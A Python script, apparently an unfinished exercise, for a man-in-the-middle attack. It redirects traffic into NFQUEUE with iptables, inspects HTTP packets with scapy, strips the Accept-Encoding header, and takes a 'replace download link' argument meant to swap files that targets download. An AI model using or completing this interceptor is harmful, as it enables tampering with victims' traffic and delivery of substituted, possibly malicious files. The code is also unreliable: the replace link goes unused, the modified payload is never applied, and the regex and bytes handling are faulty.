#!/usr/bin/env python3

# @Author - Avish Dhirawat
# Date - 07/10/2020

import netfilterqueue
import subprocess
import scapy.all as scapy
import argparse
import re

def get_arguments(): # Function to get arguments in command line
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--choice', dest = "choice", help = "Choice for Intersystem Spoofing(1) and Intrasystem Spoofing(2)")
    parser.add_argument('-r', '--replace', dest = "replace_download_link", help = "Link you want to forward the target to download replaced file")
    options = parser.parse_args()
    if options.choice not in [1,2,"1","2"]:
        parser.error("[-] Please enter correct options for choice, use --help for more info")
    elif not options.replace_download_link:
        parser.error("[-] Please specify the replace link, use --help for more info")
    else:
        return options

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            #print "{+} HTTP Request > \n"
            print("[+] HTTP Request ")
            # print(scapy_packet.show())
            # Substituting the Accept-Encoding part to get plain HTML Code
            modified_load = re.sub("Accept-Encoding:*?\\r\\n", "", scapy_packet[scapy.Raw].load)
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP Response")
    packet.accept()

try:
    options = get_arguments()
    choice = options.choice
    replace_download_link = options.replace_download_link

    if(choice == 1 or choice == "1"): # Had to add "or" condition so that it supports both python2 and python3
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell = True)
        print("\n[+] Created IPTABLE for FORWARD\n")
    elif(choice == 2 or choice == "2"):
        subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell = True)
        subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell = True)
        print("\n[+] Created iptable for INPUT and OUTPUT\n")
    else:
        print("[-] Invalid Choice.... Exiting.....")
        exit()


    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C........ Exiting... ....")
    subprocess.call("iptables --flush", shell = True)
